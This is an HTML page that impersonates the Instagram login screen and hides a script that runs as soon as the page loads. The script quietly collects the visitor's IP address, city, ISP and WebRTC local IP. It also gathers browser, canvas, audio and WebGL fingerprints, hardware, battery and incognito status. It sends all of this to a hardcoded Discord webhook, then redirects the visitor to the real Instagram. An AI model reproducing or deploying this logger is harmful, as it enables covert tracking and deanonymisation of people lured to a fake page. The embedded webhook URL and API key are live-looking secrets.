<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram ‚Ä¢ Log in to your account</title>
    <style>
        /* Basic Reset & Font */
        body, html {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Main Container */
        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 350px;
            padding: 20px;
        }

        /* Login Box */
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 10px 0;
            width: 100%;
            margin-bottom: 10px;
        }

        /* Logo */
        .logo {
            margin: 36px auto 12px;
            height: 51px;
            background: url('https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a3.png') no-repeat center;
            background-size: contain;
            width: 175px;
        }

        /* Form Styles */
        .form-container {
            padding: 0 40px;
        }
        .input-field {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            color: #262626;
            font-size: 14px;
            margin-bottom: 6px;
            padding: 9px 0 7px 8px;
            width: 100%;
            box-sizing: border-box;
        }
        .input-field:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        .login-button {
            background: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            margin: 8px 0;
            padding: 8px;
            width: 100%;
            cursor: pointer;
        }
        .login-button:disabled {
            background: #b2dffc;
        }

        /* Divider */
        .divider {
            display: flex;
            flex-direction: row;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 10px 40px 18px;
        }
        .divider-line {
            flex-grow: 1;
            height: 1px;
            position: relative;
            top: 0.45em;
        }
        .divider-line:first-child {
            background: #dbdbdb;
            margin-right: 18px;
        }
        .divider-line:last-child {
            background: #dbdbdb;
            margin-left: 18px;
        }

        /* Footer */
        .footer-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 10px;
            width: 100%;
            text-align: center;
            font-size: 14px;
        }
        .footer-box a {
            color: #00376b;
            text-decoration: none;
            font-weight: 600;
        }
        .app-download {
            margin-top: 20px;
            text-align: center;
        }
        .app-download p {
            font-size: 14px;
            margin: 10px 0;
        }
        .app-stores {
            display: flex;
            justify-content: center;
            gap: 8px;
        }
        .app-stores img {
            height: 40px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="login-box">
            <div class="logo"></div>
            <div class="form-container">
                <form id="loginForm">
                    <input type="text" class="input-field" placeholder="Phone number, username, or email" disabled>
                    <input type="password" class="input-field" placeholder="Password" disabled>
                    <button type="submit" class="login-button" disabled>Log in</button>
                </form>
                <div class="divider">
                    <div class="divider-line"></div>
                    <div>OR</div>
                    <div class="divider-line"></div>
                </div>
                <div style="text-align: center; margin-bottom: 20px;">
                    <a href="#" style="text-decoration: none; color: #385185; font-weight: 600; font-size: 14px;">
                        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a3.png" alt="FB" style="height: 16px; vertical-align: middle; margin-right: 8px; filter: grayscale(100%); opacity: 0.5;">
                        Log in with Facebook
                    </a>
                </div>
                <a href="#" style="display: block; text-align: center; color: #00376b; font-size: 12px; margin-top: 12px;">Forgot password?</a>
            </div>
        </div>

        <div class="footer-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>

        <div class="app-download">
            <p>Get the app.</p>
            <div class="app-stores">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/y4/r/LI-SE3kK-__.png" alt="App Store">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yH/r/WqJj9u6rEg_.png" alt="Google Play">
            </div>
        </div>
    </div>

    <!-- FingerprintJS Library -->
    <script src="https://fpjscdn.net/v3"></script>

    <script>
        // --- CONFIGURATION ---
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1453796643962093753/Qs2ToCH2-b0CHZBXqTyWeWXwwG4nD2AVe94Wzm_EcwUrYWW1V2OqVwhJIYxzfAl6bsRt";
        const FINGERPRINT_PUBLIC_KEY = "OZ32MdWEuPUfwlPD5MvN";
        const FINAL_REDIRECT_URL = "https://www.instagram.com";

        // --- DO NOT EDIT BELOW THIS LINE ---

        async function getAdvancedFingerprint() {
            const fp = await FingerprintJS.load({ apiKey: FINGERPRINT_PUBLIC_KEY });
            const result = await fp.get({ extendedResult: true });
            return result;
        }

        async function getWebRTCIP() {
            return new Promise((resolve) => {
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                rtc.onicecandidate = (event) => {
                    if (event && event.candidate && event.candidate.candidate) {
                        const ipMatch = event.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                        if (ipMatch) {
                            resolve(ipMatch[0]);
                            rtc.close();
                        }
                    }
                };
                setTimeout(() => { resolve(null); rtc.close(); }, 2000);
            });
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging
                };
            }
            return null;
        }

        async function getAudioFingerprint() {
            try {
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const analyser = audioContext.createAnalyser();
                const gainNode = audioContext.createGain();
                const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);

                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;

                gainNode.gain.value = 0;

                oscillator.connect(analyser);
                analyser.connect(scriptProcessor);
                scriptProcessor.connect(gainNode);
                gainNode.connect(audioContext.destination);

                oscillator.start();
                return new Promise(resolve => {
                    scriptProcessor.onaudioprocess = (event) => {
                        const fingerprint = event.inputBuffer.getChannelData(0).slice(0, 50).join('');
                        oscillator.stop();
                        audioContext.close();
                        resolve(fingerprint);
                    };
                });
            } catch (e) {
                return "AudioContext not supported";
            }
        }

        function getPrivacySettings() {
            return {
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                plugins: Array.from(navigator.plugins).map(p => p.name).slice(0, 10),
                javaEnabled: typeof navigator.javaEnabled === 'function' ? navigator.javaEnabled() : false,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
            };
        }

        async function logAndRedirect() {
            try {
                const [ipData, fpResult, webrtcIP, battery, audioFingerprint, privacySettings] = await Promise.allSettled([
                    fetch('https://ipapi.co/json/').then(r => r.json()),
                    getAdvancedFingerprint(),
                    getWebRTCIP(),
                    getBatteryInfo(),
                    getAudioFingerprint(),
                    Promise.resolve(getPrivacySettings())
                ]);

                const payload = {
                    // --- IP & Location ---
                    ip: ipData.value?.ip,
                    city: ipData.value?.city,
                    region: ipData.value?.region,
                    country: ipData.value?.country_name,
                    isp: ipData.value?.org,
                    timezone: ipData.value?.timezone,

                    // --- Core Fingerprint ---
                    fingerprintId: fpResult.value?.visitorId,
                    confidence: fpResult.value?.confidence.score,

                    // --- Browser & Software ---
                    browser: fpResult.value?.browserName,
                    browserVersion: fpResult.value?.browserVersion,
                    os: fpResult.value?.os,
                    osVersion: fpResult.value?.osVersion,
                    device: fpResult.value?.device,
                    language: navigator.language,
                    languages: navigator.languages,
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,

                    // --- Hardware & PC Info ---
                    screenResolution: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth,
                    devicePixelRatio: window.devicePixelRatio,
                    deviceMemory: navigator.deviceMemory || 'N/A',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                    gpu: fpResult.value?.graphicsCard?.renderer,
                    gpuVendor: fpResult.value?.graphicsCard?.vendor,

                    // --- Advanced Fingerprints ---
                    audioFingerprint: audioFingerprint.value,
                    canvasFingerprint: fpResult.value?.canvasHash,
                    webglFingerprint: fpResult.value?.webGlHash,
                    fontFingerprint: fpResult.value?.fontHash,

                    // --- Network & Connection ---
                    webrtcIP: webrtcIP.value,
                    connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'N/A',
                    downlink: (navigator.connection && navigator.connection.downlink) ? navigator.connection.downlink : 'N/A',
                    rtt: (navigator.connection && navigator.connection.rtt) ? navigator.connection.rtt : 'N/A',

                    // --- Battery & Sensors ---
                    batteryLevel: battery.value?.level,
                    batteryCharging: battery.value?.charging,

                    // --- Privacy & Security ---
                    privacy: privacySettings.value,
                    incognito: fpResult.value?.incognito,
                };

                // --- Create a Rich Discord Embed ---
                const embed = {
                    "title": "üîç Advanced User Logged",
                    "description": `A user from **${payload.city || 'N/A'}** has been logged.`,
                    "color": 5814783,
                    "fields": [
                        {
                            "name": "üìç IP & Location",
                            "value": `**IP:** \`${payload.ip}\`\n**City:** ${payload.city}\n**Region:** ${payload.region}\n**Country:** ${payload.country}\n**ISP:** ${payload.isp}`,
                            "inline": true
                        },
                        {
                            "name": "üíª Device & Browser",
                            "value": `**OS:** ${payload.os} ${payload.osVersion}\n**Browser:** ${payload.browser} ${payload.browserVersion}\n**Device:** ${payload.device}\n**Platform:** ${payload.platform}`,
                            "inline": true
                        },
                        {
                            "name": "üîß Hardware",
                            "value": `**Screen:** ${payload.screenResolution} (${payload.colorDepth} bit)\n**GPU:** ${payload.gpuVendor} - ${payload.gpu}\n**Memory:** ${payload.deviceMemory} GB\n**Cores:** ${payload.hardwareConcurrency}`,
                            "inline": false
                        },
                        {
                            "name": "üåê Network",
                            "value": `**WebRTC IP:** \`${payload.webrtcIP || 'N/A'}\`\n**Connection:** ${payload.connectionType}\n**Downlink:** ${payload.downlink} Mbps\n**RTT:** ${payload.rtt} ms`,
                            "inline": false
                        },
                        {
                            "name": "üîã Power & Sensors",
                            "value": `**Battery Level:** ${Math.round((payload.batteryLevel || 0) * 100)}%\n**Charging:** ${payload.batteryCharging ? 'Yes' : 'No'}`,
                            "inline": true
                        },
                        {
                            "name": "üõ°Ô∏è Privacy",
                            "value": `**Cookies:** ${payload.privacy?.cookieEnabled ? 'Enabled' : 'Disabled'}\n**DNT:** ${payload.privacy?.doNotTrack}\n**Incognito:** ${payload.incognito ? 'Likely' : 'Unlikely'}`,
                            "inline": true
                        },
                        {
                            "name": "üÜî Fingerprints",
                            "value": `**Fingerprint ID:** \`${payload.fingerprintId}\`\n**Canvas Hash:** \`${payload.canvasFingerprint}\`\n**WebGL Hash:** \`${payload.webglFingerprint}\`\n**Font Hash:** \`${payload.fontFingerprint}\``,
                            "inline": false
                        }
                    ],
                    "footer": {
                        "text": `Logged at ${new Date().toISOString()}`
                    }
                };

                const discord_payload = {
                    "username": "Advanced Logger",
                    "embeds": [embed]
                };

                // Send the data to the Discord webhook
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(discord_payload)
                });

                console.log("Advanced data logged to Discord successfully!");

            } catch (error) {
                console.error("Failed to log data:", error);
            } finally {
                // 5. Redirect to the final URL regardless of success or failure
                window.location.href = FINAL_REDIRECT_URL;
            }
        }

        // Run the logging function as soon as the page loads
        window.addEventListener('load', logAndRedirect);

    </script>
</body>
</html>
